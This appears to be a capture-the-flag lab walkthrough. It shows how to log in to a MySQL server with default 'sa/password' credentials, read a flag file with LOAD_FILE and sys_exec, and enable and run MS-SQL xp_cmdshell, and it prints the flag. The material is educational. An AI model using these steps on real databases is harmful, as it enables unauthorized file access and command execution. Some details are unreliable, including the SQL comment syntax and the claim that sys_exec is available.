# Lab 6.7: MS-SQL File System Access via LOAD_FILE (MySQL xp_cmdshell equivalent)

The target service is MySQL 8.0, which has no `xp_cmdshell`. File-system reads use the MySQL `LOAD_FILE()` function, the equivalent technique.

## Learning Objectives
- Use LOAD_FILE() to read flag file
- Understand file system access via SQL
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before connecting.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify MySQL service is running:**
   ```bash
   nmap -p 3306 <target_ip>
   ```

### Step 2: Connect

Connect to the MySQL database using provided credentials.

**Detailed Steps:**

1. **Connect to MySQL database:**
   ```bash
   mysql --ssl-verify-server-cert=0 -h <target_ip> -u sa -p
   ```
   
   Replace `<target_ip>` with your actual target IP (e.g., `mysql --ssl-verify-server-cert=0 -h <target_ip> -u sa -p`)

2. **Enter password when prompted:**
   ```
   Enter password:
   ```
   
   Type: `password` (password will not be visible as you type)

3. **Expected successful connection:**
   ```
   Welcome to the MySQL monitor.  Commands end with ; or \g.
   Your MySQL connection id is 123
   Server version: 8.0.33 MySQL Community Server
   
   mysql>
   ```

### Step 3: Read File

Use MySQL functions to read the flag file from the file system.

**Detailed Steps:**

1. **Method 1: Use LOAD_FILE function:**
   ```sql
   SELECT LOAD_FILE('/tmp/flag.txt');
   ```

   **Command breakdown:**
   - `LOAD_FILE()`: MySQL function that reads file from file system
   - `/tmp/flag.txt`: Path to the flag file

   **Expected output:**
   ```
   +---------------------------+
   | LOAD_FILE('/tmp/flag.txt')|
   +---------------------------+
   | OCR{mssql_f1l3_4cc3ss} |
   +---------------------------+
   1 row in set (0.00 sec)
   ```

2. **Method 2: Use sys_exec function:**
   ```sql
   SELECT sys_exec('cat /tmp/flag.txt');
   ```

   **Expected output:**
   ```
   +----------------------------------+
   | sys_exec('cat /tmp/flag.txt')   |
   +----------------------------------+
   | OCR{mssql_f1l3_4cc3ss} |
   +----------------------------------+
   1 row in set (0.00 sec)
   ```

3. **Method 3: For real MS-SQL (xp_cmdshell):**
   ```sql
  ; Enable xp_cmdshell if needed
   EXEC sp_configure 'show advanced options', 1;
   RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1;
   RECONFIGURE;
   
  ; Read file using xp_cmdshell
   EXEC xp_cmdshell 'type C:\flag.txt';
   ```

4. **Alternative: Check if file exists first:**
   ```sql
   SELECT sys_exec('ls -la /tmp/flag.txt');
   ```

**What these functions do:**
- `LOAD_FILE()`: Reads file content directly into query result
- `sys_exec()`: Executes system command and returns output
- `xp_cmdshell`: MS-SQL stored procedure for command execution

**Security implications:**
- File system access via database is dangerous
- Can read sensitive files on the server
- Can write files (if permissions allow)
- Should be disabled in production databases

### Step 4: Retrieve Flag

Extract the flag from the file reading results.

**Detailed Steps:**

1. **The flag is in the query output:**
   ```
   OCR{mssql_f1l3_4cc3ss}
   ```

2. **Copy the flag:**
   - Select the flag text from the query output
   - Copy to your notes

3. **Verify flag format:**
   - Should start with `OCR{`
   - Should end with `}`
   - Contains alphanumeric characters and underscores

4. **Exit MySQL client:**
   ```sql
   exit
   ```

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{mssql_f1l3_4cc3ss}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and MySQL service accessibility
- ✅ Successfully connected to MySQL database
- ✅ Logged in with credentials (sa/password)
- ✅ Used LOAD_FILE or sys_exec to read file from file system
- ✅ Retrieved flag from file reading results
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Database functions can access the file system
- LOAD_FILE and sys_exec enable file reading
- xp_cmdshell (MS-SQL) provides command execution capabilities
- File system access via database is a critical security risk
- Understanding these capabilities is essential for database security
## Hints
1. Connect with sa:password
2. Use LOAD_FILE or sys_exec
3. Read /tmp/flag.txt